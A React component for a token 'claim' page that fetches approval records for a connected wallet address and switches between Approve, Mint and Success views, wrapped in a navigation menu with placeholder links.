import React, { useEffect, useState } from 'react'

import Header from '../../components/header'
import Footer from '../../components/footer'
import { useSetting } from '../../provider/setting'
import { getFilter } from '../../api/approve'
import Success from './success'
import Approve from './approve'
import Mint from './mint'

const Claim = () => {
  const [setting] = useSetting()
  const [approves, setApproves] = useState([])
  const [isMint, setIsMint] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)

  useEffect(() => {
    if (setting.address && setting.address !== '') {
      (async () => {
        const res = await getFilter({address: setting.address})
        console.log(res)
        setApproves(res)
        if (res.length !== 0)
          setIsMint(res[0].isMint)
      })()
    }
  }, [setting.address])
  return (
    <>
      <Header />
      <div className="nav-responsive">
        <div className="nav-responsive-backdrop"></div>
        <div className="nav-responsive-content d-flex flex-column">
          <div className="logo d-flex align-items-center justify-content-center position-relative">
            <a href="#" className="position-relative">
              <img src="./assets/images/logo-2.png" alt="logo" />
            </a>
          </div>
          <ul className="menu">
            <li>
              <a href="#">
                <i className="icon-home"></i>
                home
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-info"></i>
                About
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-book"></i>
                Terms and rules
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-document"></i>
                Contract
              </a>
            </li>
          </ul>
          <ul className="socials d-flex align-items-center justify-content-center">
            <li>
              <a href="#">
                <i className="icon-telegram"></i>
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-instagram"></i>
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-facebook"></i>
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-twitter"></i>
              </a>
            </li>
            <li>
              <a href="#">
                <i className="icon-discord"></i>
              </a>
            </li>
          </ul>
        </div>
      </div>
      <div className="claim-tokens">
        <div className="container">
          <div className="claim-tokens-wrapper position-relative">
            <div className="image">
              <img src="./assets/images/img-02.png" alt="image" />
            </div>
            {(setting?.address)?(
              <>
                {isSuccess ? (
                  <Success />
                ):(
                  <>
                    {isMint ? (
                      <Mint approves={approves} setIsSuccess={setIsSuccess} />
                      ):(
                      <Approve approves={approves} setIsMint={setIsMint} />
                    )}
                  </>
                )
                }
              </>
            ):(
              <div className="title text-center">
                Please connect wallet!
              </div>
            )}
          </div>
        </div>
      </div>
      <Footer />
    </>
  )
}
export default Claim
